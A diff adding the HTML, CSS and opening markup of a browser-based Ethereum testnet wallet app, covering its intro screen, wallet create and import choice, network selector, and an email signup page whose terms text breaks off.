@@ -1,0 +1,3511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MINI ETHEREUM WALLET</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script type="module">
+    import {
+      createPublicClient,
+      createWalletClient,
+      http,
+      formatEther,
+      parseEther,
+      isAddress,
+    } from 'https://esm.sh/viem';
+    import { holesky, sepolia } from 'https://esm.sh/viem/chains';
+    import { generatePrivateKey, privateKeyToAccount } from 'https://esm.sh/viem/accounts';
+
+    // Make Viem functions globally available
+    window.viem = {
+      createPublicClient,
+      createWalletClient,
+      http,
+      formatEther,
+      parseEther,
+      isAddress,
+      holesky,
+      sepolia,
+      generatePrivateKey,
+      privateKeyToAccount
+    };
+  </script>
+  <style>
+    /* All your existing CSS styles remain exactly the same */
+    :root {
+      --gold: #FFD700;
+      --text-color: #fff;
+      --accent: #b38b00;
+      --bg-dark: #0a0a0a;
+      --glass-bg: rgba(255, 255, 255, 0.08);
+      --glass-border: rgba(255, 255, 255, 0.15);
+      --success-color: #4ECDC4;
+      --warning-color: #FFD166;
+      --error-color: #FF6B6B;
+      --neon-blue: #00F3FF;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background: var(--bg-dark);
+      color: var(--text-color);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ================= ETHEREUM CINEMATIC INTRO ================= */
+    #intro-screen {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      background: radial-gradient(circle at center, #111 0%, #000 90%);
+      z-index: 1000;
+    }
+
+    #particle-canvas {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: radial-gradient(circle at center, #0b0b0d 0%, #000000 80%);
+      z-index: 1;
+    }
+
+    .eth-logo-container {
+      position: relative;
+      text-align: center;
+      z-index: 10;
+      animation: fadeIn 2s ease-in-out forwards;
+    }
+
+    .eth-symbol {
+      position: relative;
+      width: 120px;
+      height: 180px;
+      margin: 0 auto 25px;
+      animation: floatLogo 5s ease-in-out infinite;
+    }
+
+    .eth-top, .eth-bottom {
+      position: absolute;
+      left: 0;
+      width: 0;
+      height: 0;
+      border-left: 60px solid transparent;
+      border-right: 60px solid transparent;
+    }
+
+    .eth-top {
+      border-bottom: 90px solid var(--gold);
+      animation: glowGold 2s infinite alternate;
+    }
+
+    .eth-bottom {
+      top: 90px;
+      border-top: 90px solid var(--gold);
+      opacity: 0.85;
+      animation: glowGold 2s infinite alternate-reverse;
+    }
+
+    .intro-title {
+      font-size: 2.8rem;
+      color: var(--gold);
+      letter-spacing: 2px;
+      text-shadow: 0 0 25px var(--gold);
+      animation: textPulse 4s ease-in-out infinite;
+    }
+
+    .intro-subtitle {
+      color: #aaa;
+      margin: 10px 0 25px;
+      font-size: 1.1rem;
+      letter-spacing: 1px;
+    }
+
+    .start-button {
+      background: linear-gradient(90deg, var(--gold), var(--accent));
+      border: none;
+      color: #000;
+      padding: 14px 45px;
+      font-size: 1rem;
+      border-radius: 50px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
+      transition: all 0.3s ease;
+      animation: glowButton 2s infinite alternate;
+    }
+
+    .start-button:hover {
+      transform: scale(1.08);
+      box-shadow: 0 0 40px rgba(255, 215, 0, 1);
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @keyframes floatLogo {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
+
+    @keyframes glowGold {
+      0% { filter: drop-shadow(0 0 10px var(--gold)); }
+      100% { filter: drop-shadow(0 0 30px var(--gold)); }
+    }
+
+    @keyframes textPulse {
+      0%, 100% { text-shadow: 0 0 25px var(--gold); }
+      50% { text-shadow: 0 0 40px var(--gold); }
+    }
+
+    @keyframes glowButton {
+      0% { box-shadow: 0 0 10px rgba(255,215,0,0.5); }
+      100% { box-shadow: 0 0 30px rgba(255,215,0,1); }
+    }
+
+    /* ============== WALLET MAIN CONTAINER ============== */
+    .container {
+      width: 90%;
+      max-width: 500px;
+      display: none;
+      z-index: 2;
+      position: relative;
+    }
+
+    .glass-card {
+      background: var(--glass-bg);
+      backdrop-filter: blur(12px);
+      border-radius: 16px;
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
+      padding: 30px;
+      margin-bottom: 20px;
+      transition: all 0.4s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .glass-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 25px;
+      position: relative;
+    }
+
+    .logo-icon {
+      font-size: 3rem;
+      margin-bottom: 10px;
+      color: var(--gold);
+      animation: rotate 20s infinite linear;
+    }
+
+    @keyframes rotate {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .logo h1 {
+      font-size: 2.5rem;
+      color: var(--gold);
+      margin-bottom: 5px;
+      animation: glow 2s infinite alternate;
+    }
+
+    @keyframes glow {
+      from { text-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+      to { text-shadow: 0 0 15px rgba(255, 215, 0, 0.8); }
+    }
+
+    .logo p {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 0.9rem;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-weight: 500;
+      color: rgba(255, 255, 255, 0.9);
+    }
+
+    input, select, button, textarea {
+      width: 100%;
+      padding: 14px 16px;
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      background: rgba(255, 255, 255, 0.07);
+      color: var(--text-color);
+      font-size: 1rem;
+      outline: none;
+      transition: all 0.3s ease;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 2px rgba(255, 215, 0, 0.3);
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    button {
+      background: linear-gradient(90deg, var(--gold), var(--accent));
+      border: none;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 10px;
+      position: relative;
+      overflow: hidden;
+      z-index: 1;
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+      transition: 0.5s;
+      z-index: -1;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, var(--accent), var(--gold));
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    button:disabled {
+      background: rgba(255, 255, 255, 0.2);
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+
+    button:disabled::before {
+      display: none;
+    }
+
+    .link-text {
+      text-align: center;
+      margin-top: 20px;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .link-text a {
+      color: var(--gold);
+      text-decoration: none;
+      font-weight: 500;
+      position: relative;
+    }
+
+    .link-text a::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      width: 0;
+      height: 1px;
+      background: var(--gold);
+      transition: width 0.3s ease;
+    }
+
+    .link-text a:hover::after {
+      width: 100%;
+    }
+
+    .wallet-info {
+      margin-bottom: 20px;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 16px;
+      word-break: break-all;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .wallet-info::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 5px;
+      height: 100%;
+      background: linear-gradient(135deg, var(--gold), var(--accent));
+    }
+
+    .wallet-address {
+      font-size: 0.9rem;
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .balance {
+      font-size: 2rem;
+      font-weight: bold;
+      text-align: center;
+      margin: 15px 0;
+      background: linear-gradient(135deg, var(--gold), var(--accent));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .transaction-history {
+      max-height: 300px;
+      overflow-y: auto;
+      margin-top: 20px;
+    }
+
+    .transaction-item {
+      padding: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: all 0.3s ease;
+      border-radius: 10px;
+      margin-bottom: 8px;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .transaction-item:hover {
+      background: rgba(255, 255, 255, 0.1);
+      transform: translateX(5px);
+    }
+
+    .transaction-item:last-child {
+      border-bottom: none;
+    }
+
+    .transaction-icon {
+      font-size: 1.2rem;
+      margin-right: 10px;
+    }
+
+    .transaction-details {
+      flex: 1;
+    }
+
+    .transaction-amount {
+      font-weight: bold;
+      font-size: 1.1rem;
+    }
+
+    .gas-info {
+      display: flex;
+      justify-content: space-between;
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .tab-container {
+      display: flex;
+      margin-bottom: 20px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .tab {
+      padding: 12px 20px;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s ease;
+      flex: 1;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .tab:hover {
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .tab.active {
+      border-bottom: 2px solid var(--gold);
+      color: var(--gold);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 15px 20px;
+      border-radius: 12px;
+      background: var(--glass-bg);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
+      z-index: 1000;
+      transform: translateX(150%);
+      transition: transform 0.4s ease;
+      max-width: 350px;
+    }
+
+    .notification.show {
+      transform: translateX(0);
+    }
+
+    .notification.success {
+      border-left: 4px solid var(--success-color);
+    }
+
+    .notification.error {
+      border-left: 4px solid var(--error-color);
+    }
+
+    .notification.info {
+      border-left: 4px solid var(--gold);
+    }
+
+    .private-key-warning {
+      color: var(--error-color);
+      font-size: 0.8rem;
+      margin-top: 5px;
+      text-align: center;
+    }
+
+    .back-button {
+      background: rgba(255, 255, 255, 0.1);
+      margin-bottom: 15px;
+      width: auto;
+      padding: 10px 15px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .back-button:hover {
+      background: rgba(255, 255, 255, 0.2);
+    }
+
+    .copy-button {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 8px 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 0.8rem;
+      width: auto;
+      margin: 0;
+      transition: all 0.3s ease;
+    }
+
+    .copy-button:hover {
+      background: rgba(255, 255, 255, 0.1);
+      transform: scale(1.05);
+    }
+
+    .copy-button.copied {
+      background: var(--success-color);
+      color: #000;
+    }
+
+    .network-indicator {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      color: var(--success-color);
+    }
+
+    .network-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--success-color);
+      animation: pulse-dot 2s infinite;
+    }
+
+    @keyframes pulse-dot {
+      0% { opacity: 0.4; }
+      50% { opacity: 1; }
+      100% { opacity: 0.4; }
+    }
+
+    .key-display {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 15px;
+      border-radius: 12px;
+      margin: 15px 0;
+      border-left: 4px solid var(--warning-color);
+    }
+
+    .key-display h3 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      color: var(--warning-color);
+    }
+
+    .key-value {
+      word-break: break-all;
+      font-family: monospace;
+      font-size: 0.9rem;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 10px;
+      border-radius: 8px;
+      margin: 10px 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .security-info {
+      background: rgba(255, 209, 102, 0.1);
+      border: 1px solid rgba(255, 209, 102, 0.3);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 15px 0;
+    }
+
+    .security-info h3 {
+      color: var(--warning-color);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .security-info ul {
+      padding-left: 20px;
+    }
+
+    .security-info li {
+      margin-bottom: 8px;
+      font-size: 0.9rem;
+    }
+
+    .comparison-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+      font-size: 0.85rem;
+    }
+
+    .comparison-table th, .comparison-table td {
+      padding: 10px;
+      text-align: left;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .comparison-table th {
+      background: rgba(255, 215, 0, 0.2);
+      color: var(--gold);
+    }
+
+    .feature-check {
+      color: var(--success-color);
+    }
+
+    .feature-cross {
+      color: var(--error-color);
+    }
+
+    .motivation-section {
+      margin: 20px 0;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+    }
+
+    .motivation-section h3 {
+      color: var(--gold);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .otp-container {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .otp-input {
+      width: 50px;
+      height: 50px;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: bold;
+      background: rgba(255, 255, 255, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .terms-container {
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      max-height: 200px;
+      overflow-y: auto;
+    }
+
+    .terms-text {
+      font-size: 0.85rem;
+      line-height: 1.4;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      margin-top: 2px;
+    }
+
+    .checkbox-group label {
+      margin-bottom: 0;
+      font-size: 0.9rem;
+    }
+
+    .seed-phrase-container {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px 0;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .seed-phrase {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .seed-word {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 10px;
+      border-radius: 8px;
+      text-align: center;
+      font-family: monospace;
+      font-weight: bold;
+    }
+
+    .seed-word-number {
+      color: rgba(255, 255, 255, 0.5);
+      font-size: 0.8rem;
+      margin-right: 5px;
+    }
+
+    .confirm-seed-container {
+      margin: 20px 0;
+    }
+
+    .confirm-seed-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .confirm-seed-word {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    .confirm-seed-word:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    .confirm-seed-word.selected {
+      background: rgba(255, 215, 0, 0.3);
+      border: 1px solid var(--gold);
+    }
+
+    .selected-words-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin: 15px 0;
+      min-height: 50px;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+    }
+
+    .selected-word {
+      background: rgba(255, 215, 0, 0.3);
+      padding: 8px 12px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .remove-word {
+      background: none;
+      border: none;
+      color: var(--error-color);
+      cursor: pointer;
+      padding: 0;
+      width: auto;
+      font-size: 0.8rem;
+    }
+
+    .password-strength {
+      height: 5px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 3px;
+      margin-top: 5px;
+      overflow: hidden;
+    }
+
+    .password-strength-bar {
+      height: 100%;
+      width: 0%;
+      transition: all 0.3s ease;
+    }
+
+    .password-strength.weak .password-strength-bar {
+      width: 33%;
+      background: var(--error-color);
+    }
+
+    .password-strength.medium .password-strength-bar {
+      width: 66%;
+      background: var(--warning-color);
+    }
+
+    .password-strength.strong .password-strength-bar {
+      width: 100%;
+      background: var(--success-color);
+    }
+
+    .api-features {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin: 15px 0;
+    }
+
+    .api-feature {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    .api-feature i {
+      font-size: 1.5rem;
+      color: var(--neon-blue);
+      margin-bottom: 10px;
+    }
+
+    .problem-solution-section {
+      margin: 20px 0;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      border-left: 4px solid var(--neon-blue);
+    }
+
+    .problem-solution-section h3 {
+      color: var(--neon-blue);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .problem-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 15px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .problem-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .problem-icon {
+      color: var(--error-color);
+      font-size: 1.2rem;
+    }
+
+    .solution-icon {
+      color: var(--success-color);
+      font-size: 1.2rem;
+    }
+
+    .problem-content {
+      flex: 1;
+    }
+
+    .problem-content h4 {
+      margin-bottom: 5px;
+      color: var(--error-color);
+    }
+
+    .solution-content h4 {
+      margin-bottom: 5px;
+      color: var(--success-color);
+    }
+
+    .testnet-funds {
+      background: rgba(0, 243, 255, 0.1);
+      border: 1px solid var(--neon-blue);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .testnet-funds h3 {
+      color: var(--neon-blue);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .network-selector {
+      margin: 15px 0;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .network-selector h3 {
+      color: var(--gold);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .network-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .network-option {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 12px;
+      border-radius: 8px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      border: 1px solid transparent;
+    }
+
+    .network-option:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    .network-option.active {
+      background: rgba(255, 215, 0, 0.2);
+      border: 1px solid var(--gold);
+    }
+
+    .network-option i {
+      font-size: 1.5rem;
+      margin-bottom: 5px;
+      display: block;
+    }
+
+    /* Seed Phrase Login with Blank Boxes */
+    .seed-phrase-login-container {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px 0;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .seed-phrase-inputs {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 15px 0;
+    }
+
+    .seed-input-group {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .seed-input-number {
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 0.8rem;
+      min-width: 20px;
+    }
+
+    .seed-input {
+      flex: 1;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text-color);
+      text-align: center;
+    }
+
+    .seed-input:focus {
+      border-color: var(--gold);
+      box-shadow: 0 0 0 2px rgba(255, 215, 0, 0.3);
+    }
+
+    /* Keys Display Page */
+    .keys-display-container {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px 0;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .key-item {
+      margin-bottom: 20px;
+      padding-bottom: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .key-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+    }
+
+    .key-label {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      color: var(--gold);
+    }
+
+    .key-value-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 12px;
+      border-radius: 8px;
+    }
+
+    .key-text {
+      font-family: monospace;
+      font-size: 0.85rem;
+      word-break: break-all;
+      flex: 1;
+      margin-right: 10px;
+    }
+
+    /* Transaction Fee Details */
+    .transaction-fee-details {
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.7);
+      margin-top: 5px;
+    }
+
+    .transaction-fee-details span {
+      color: var(--warning-color);
+    }
+
+    /* Self Transfer Warning */
+    .self-transfer-warning {
+      background: rgba(255, 107, 107, 0.1);
+      border: 1px solid var(--error-color);
+      border-radius: 12px;
+      padding: 15px;
+      margin: 15px 0;
+      display: none;
+    }
+
+    .self-transfer-warning.show {
+      display: block;
+    }
+
+    .self-transfer-warning h3 {
+      color: var(--error-color);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Browser Toast Notification */
+    .browser-toast {
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: var(--glass-bg);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--glass-border);
+      border-radius: 12px;
+      padding: 15px 20px;
+      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.36);
+      z-index: 1001;
+      transition: transform 0.4s ease;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .browser-toast.show {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .browser-toast.success {
+      border-left: 4px solid var(--success-color);
+    }
+
+    .browser-toast.error {
+      border-left: 4px solid var(--error-color);
+    }
+
+    .browser-toast.info {
+      border-left: 4px solid var(--gold);
+    }
+
+    /* Viem Integration Styles */
+    .tx-item {
+      padding: 15px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      transition: all 0.3s ease;
+      border-radius: 10px;
+      margin-bottom: 8px;
+      background: rgba(255, 255, 255, 0.05);
+    }
+
+    .tx-item:hover {
+      background: rgba(255, 255, 255, 0.1);
+      transform: translateX(5px);
+    }
+
+    .tx-details {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .tx-direction {
+      padding: 4px 8px;
+      border-radius: 6px;
+      font-size: 0.8rem;
+      font-weight: bold;
+    }
+
+    .tx-direction-in {
+      background: rgba(78, 205, 196, 0.2);
+      color: var(--success-color);
+    }
+
+    .tx-direction-out {
+      background: rgba(255, 107, 107, 0.2);
+      color: var(--error-color);
+    }
+
+    .tx-direction-error {
+      background: rgba(255, 107, 107, 0.2);
+      color: var(--error-color);
+    }
+
+    .tx-info {
+      flex: 1;
+    }
+
+    .tx-amount {
+      font-weight: bold;
+      font-size: 1rem;
+    }
+
+    .tx-address {
+      font-size: 0.85rem;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .tx-meta {
+      display: flex;
+      gap: 10px;
+      font-size: 0.75rem;
+      color: rgba(255, 255, 255, 0.6);
+      margin-top: 5px;
+    }
+
+    .tx-status {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .tx-link a {
+      color: var(--gold);
+      text-decoration: none;
+      font-size: 0.85rem;
+    }
+
+    .tx-link a:hover {
+      text-decoration: underline;
+    }
+
+    .tx-count {
+      text-align: center;
+      padding: 10px;
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 0.85rem;
+    }
+
+    .tx-failed {
+      opacity: 0.7;
+    }
+
+    .filter-container {
+      margin-bottom: 15px;
+      display: flex;
+      gap: 10px;
+    }
+
+    .filter-container select {
+      flex: 1;
+    }
+
+    .refresh-btn {
+      width: auto;
+      padding: 10px 15px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        max-width: 100%;
+      }
+      
+      .glass-card {
+        padding: 20px;
+      }
+      
+      .logo h1 {
+        font-size: 2rem;
+      }
+
+      .tab {
+        padding: 10px 15px;
+        font-size: 0.9rem;
+      }
+
+      .intro-title {
+        font-size: 2.5rem;
+      }
+
+      .api-features {
+        grid-template-columns: 1fr;
+      }
+
+      .seed-phrase {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .confirm-seed-grid {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .network-options {
+        grid-template-columns: 1fr;
+      }
+
+      .seed-phrase-inputs {
+        grid-template-columns: repeat(2, 1fr);
+      }
+
+      .browser-toast {
+        width: 90%;
+        max-width: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Ethereum Cinematic Intro -->
+  <div id="intro-screen">
+    <canvas id="particle-canvas"></canvas>
+    <div class="eth-logo-container">
+      <div class="eth-symbol">
+        <div class="eth-top"></div>
+        <div class="eth-bottom"></div>
+      </div>
+      <h1 class="intro-title">MINI ETHEREUM WALLET</h1>
+      <p class="intro-subtitle">Next-Generation Blockchain Interface</p>
+      <button class="start-button" id="start-app">INITIALIZE SYSTEM</button>
+    </div>
+  </div>
+
+  <!-- Main App Container -->
+  <div class="container" id="app-container">
+    <!-- Wallet Setup Choice -->
+    <div id="setup-choice" class="glass-card">
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fab fa-ethereum"></i>
+        </div>
+        <h1>MINI ETHEREUM WALLET</h1>
+        <p>The Ultimate Ethereum Experience</p>
+      </div>
+      
+      <button id="create-wallet-button" class="setup-option">
+        <i class="fas fa-plus-circle"></i> Create New Wallet
+      </button>
+      
+      <button id="import-wallet-button" class="setup-option" style="background: rgba(255, 255, 255, 0.1);">
+        <i class="fas fa-download"></i> Import Existing Wallet
+      </button>
+      
+      <div class="testnet-funds">
+        <h3><i class="fas fa-coins"></i> Testnet Funds Available</h3>
+        <p>Get 3 ETH for testing on multiple networks after wallet creation</p>
+      </div>
+
+      <div class="network-selector">
+        <h3><i class="fas fa-network-wired"></i> Multi-Network Support</h3>
+        <p>Connect to multiple blockchain networks with 99.9% uptime</p>
+        <div class="network-options">
+          <div class="network-option active" data-network="sepolia">
+            <i class="fab fa-ethereum"></i>
+            <div>Sepolia</div>
+            <small>Testnet</small>
+          </div>
+          <div class="network-option" data-network="holesky">
+            <i class="fab fa-ethereum"></i>
+            <div>Holesky</div>
+            <small>Testnet</small>
+          </div>
+          <div class="network-option" data-network="polygon">
+            <i class="fas fa-layer-group"></i>
+            <div>Polygon</div>
+            <small>Testnet</small>
+          </div>
+          <div class="network-option" data-network="arbitrum">
+            <i class="fas fa-bolt"></i>
+            <div>Arbitrum</div>
+            <small>Testnet</small>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Create Wallet with Email and OTP -->
+    <div id="signup-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-signup"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fab fa-ethereum"></i>
+        </div>
+        <h1>Create New Wallet</h1>
+        <p>Begin your secure blockchain journey</p>
+      </div>
+      
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" id="email" placeholder="Enter your email">
+      </div>
+      
+      <div class="terms-container">
+        <h3 style="margin-bottom: 10px; color: var(--gold);">Terms of Service & Privacy Policy</h3>
+        <div class="terms-text">
+          <p><strong>Last Updated:</strong> January 1, 2024</p>
+          <p><strong>1. Acceptance of Terms</strong><br>
+          By creating a Mini Ethereum Wallet, you agree to be bound by these Terms of Service and our Privacy Policy.</p>
+          
+          <p><strong>2. Non-Custodial Wallet</strong><br>
